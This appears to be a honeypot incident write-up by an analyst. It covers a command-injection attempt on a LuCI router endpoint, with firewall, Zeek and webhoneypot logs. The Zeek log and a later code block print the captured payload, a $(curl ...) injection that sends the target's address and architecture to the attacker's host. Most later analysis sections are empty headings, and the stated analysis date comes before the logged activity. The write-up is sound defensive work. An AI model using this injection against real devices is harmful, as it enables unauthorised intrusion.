# Command Injection by IP 2.237.57.70

## Time and Date of Activity
* First activity logged: **2023-11-09T03:48:19.834213**
* Last activity logged: **2023-11-09T03:48:24.825757**

## Relevant Logs, File or Email 
* IP 2.237.57.70 conncected to the honeypot over **5** sessions making **3** HTTP requests per session.
* The destination port each time was 8080. 
* The source port was a different ephemeral port each time: 59202, 52980, 64540, 50066, 53382.


#### The 5 sessions can be seen in dshield.log and conn.log

**dshield.log** shows the following:
```
1699501699 BigDshield kernel:[50987.745307]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=55359 DF PROTO=TCP SPT=53382 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501701 BigDshield kernel:[50989.149093]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=353 DF PROTO=TCP SPT=59202 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501702 BigDshield kernel:[50990.343019]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=64244 DF PROTO=TCP SPT=52980 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501703 BigDshield kernel:[50991.539811]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=30835 DF PROTO=TCP SPT=64540 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
1699501704 BigDshield kernel:[50992.733400]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=56344 DF PROTO=TCP SPT=50066 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
```
**Zeek conn.log** shows the following:
```
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]
1699501701.032478	Ck4N0V3ktsYTefptLi	2.237.57.70	59202	172.31.5.68	8080	tcp	http	0.202757	183	0	SF	F	T	0	ShADaFf	5	451	3	164	-
1699501702.226405	CJ3xmE3n2ttFoQNSq9	2.237.57.70	52980	172.31.5.68	8080	tcp	http	0.207294	183	0	SF	F	T	0	ShADFaf	5	451	3	164	-
1699501703.423175	C8Xolv1zqXbE5maT0j	2.237.57.70	64540	172.31.5.68	8080	tcp	http	0.206360	183	0	SF	F	T	0	ShADaFf	5	451	3	164	-
1699501704.616789	Cc3jU41mtCUXwzv309	2.237.57.70	50066	172.31.5.68	8080	tcp	http	0.209430	183	0	SF	F	T	0	ShADFaf	5	451	3	164	-
1699501699.628691	CvwvoH3MJsemJWUoab	2.237.57.70	53382	172.31.5.68	8080	tcp	http	0.598062	37	9384	SF	F	T	0	ShADadFfRR	10	505	7	9756	-
```

The 5 sets of 3 HTTP requests can be seen in webhoneypot-2023-11-09.log and Zeek http.log

Here is a sample of the 3 requests from **webhoneypot-2023-11-09.log**:
```
{"time":"2023-11-09T03:48:22.430959","headers":{"host":"54.67.87.80"},"sip":"2.237.57.70","dip":"54.67.87.80","method":"GET","url":"/","data":null,"useragent":"","version":"HTTP/1.1","response_id":{"comment":null,"headers":{"Server":"Apache/3.2.3","Access-Control-Allow-Origin":"*","content-type":"text/plain"},"status_code":200},"signature_id":{"max_score":72,"rules":[{"attribute":"method","condition":"equals","value":"GET","score":2,"required":false},{"attribute":"headers","condition":"absent","value":"user-agents","score":70,"required":false}]}}

{"time":"2023-11-09T03:48:22.432131","headers":{"host":"54.67.87.80"},"sip":"2.237.57.70","dip":"54.67.87.80","method":"GET","url":"/cgi-bin/luci/;stok=/locale","data":null,"useragent":"","version":"HTTP/1.1","response_id":{"comment":null,"headers":{"Server":"Apache/3.2.3","Access-Control-Allow-Origin":"*","content-type":"text/plain"},"status_code":200},"signature_id":{"max_score":72,"rules":[{"attribute":"method","condition":"equals","value":"GET","score":2,"required":false},{"attribute":"headers","condition":"absent","value":"user-agents","score":70,"required":false}]}}

{"time":"2023-11-09T03:48:22.433258","headers":{"host":"54.67.87.80"},"sip":"2.237.57.70","dip":"54.67.87.80","method":"GET","url":"/cgi-bin/luci/;stok=/locale","data":null,"useragent":"","version":"HTTP/1.1","response_id":{"comment":null,"headers":{"Server":"Apache/3.2.3","Access-Control-Allow-Origin":"*","content-type":"text/plain"},"status_code":200},"signature_id":{"max_score":72,"rules":[{"attribute":"method","condition":"equals","value":"GET","score":2,"required":false},{"attribute":"headers","condition":"absent","value":"user-agents","score":70,"required":false}]}}
```

### Notice how the command injection is not visible in the webhoneypot logs.  It is only visible in the Zeek http.log which shows the full URI.
Zeek http.log shows the following:
```
command: 
cat tests/logs/zeek/http.log | zeek-cut id.orig_h id.orig_p id.resp_h id.resp_p method host uri | grep "2.237.57.70"

id.orig_h id.orig_p id.resp_h id.resp_p method host uri
2.237.57.70     53382   172.31.5.68     8080    GET     54.67.87.80     /
2.237.57.70     59202   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
2.237.57.70     52980   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
2.237.57.70     64540   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
2.237.57.70     50066   172.31.5.68     8080    GET     54.67.87.80     /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
```

#### Here we can clearly see the command injection in the URI.  The command is the following:
```
curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);
```

## Your custom script for parsing the logs.


## Flow of the activity

## Malware Analysis

## Which vulnerability does the attack attempt to exploit?
* Exploit
* CVE
* Mitre ATT&CK

## What is the goal of the attack?

## If the system is vulnerable, do you think the attack will be successful?

## How can a system be protected from this attack?

## What do you know about the attacker?
* References
* ThreatIntel
* Whois Information
* Shodan
* CyberGordon
* AlienVault
* ISC


## Indicator of Compromised
* IP List
* Hashes
* Domain
* URL
* Yara


#### Analyst Name: Guy Bruneau 
#### Date of Analysis: 19 March 2023 
